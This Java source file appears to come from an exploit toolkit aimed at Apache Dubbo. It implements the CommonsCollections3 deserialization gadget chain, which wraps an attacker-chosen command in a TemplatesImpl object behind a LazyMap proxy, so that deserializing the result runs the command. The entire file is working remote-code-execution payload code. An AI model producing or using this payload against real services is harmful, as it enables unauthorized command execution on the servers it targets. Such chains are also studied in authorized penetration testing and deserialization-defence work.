package com.threedr3am.exp.dubbo.payload.java;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.threedr3am.exp.dubbo.payload.Payload;
import com.threedr3am.exp.dubbo.utils.Gadgets;
import com.threedr3am.exp.dubbo.utils.JavaVersion;
import com.threedr3am.exp.dubbo.utils.Reflections;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;
import javax.xml.transform.Templates;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

/*
 * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
 * InvokerTransformer.
 */

/**
 * commons-collections:commons-collections:3.1
 */
public class CommonsCollections3 implements Payload {

	private String[] args;

	public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }

	/**
	 *
	 * @param args
	 *
	 * arg[0]=cmd
	 *
	 * @return
	 * @throws Exception
	 */
	@Override
	public Object getPayload(String[] args) throws Exception {
		if (this.args != null)
			args = this.args;
		Object templatesImpl = Gadgets.createTemplatesImpl(args[0]);

		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
				new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup
		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(TrAXFilter.class),
				new InstantiateTransformer(
						new Class[] { Templates.class },
						new Object[] { templatesImpl } )};

		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

		return handler;
	}

	@Override
	public void injectDefaultArgs(String[] args) {
		this.args = args;
	}

}
